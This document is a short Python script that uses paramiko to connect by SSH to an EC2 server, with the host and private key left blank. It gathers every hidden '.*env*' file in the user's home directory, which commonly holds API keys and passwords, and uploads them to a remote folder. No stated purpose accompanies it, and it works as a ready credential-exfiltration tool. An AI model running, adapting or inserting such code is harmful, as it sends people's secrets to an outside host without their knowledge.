import paramiko
import os
import io
import glob

ec2_host = ""
ec2_port = 22
ec2_user = "ec2-user"
pem_content = """
-----BEGIN OPENSSH PRIVATE KEY-----

-----END OPENSSH PRIVATE KEY-----
"""

pem_key_obj = paramiko.RSAKey.from_private_key(io.StringIO(pem_content))

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(ec2_host, username=ec2_user, pkey=pem_key_obj)


sftp = ssh.open_sftp()

home_dir = os.path.expanduser("~")
matching_files = glob.glob(os.path.join(home_dir, ".*env*"))

remote_dir = "/home/ec2-user/files"

ssh.exec_command(f"mkdir -p {remote_dir}")

for local_file in matching_files:
    filename = os.path.basename(local_file)
    remote_file = f"{remote_dir}/{filename}"
    sftp.put(local_file, remote_file)
    print(f"Uploaded {local_file} to {remote_file}")

sftp.close()
ssh.close()


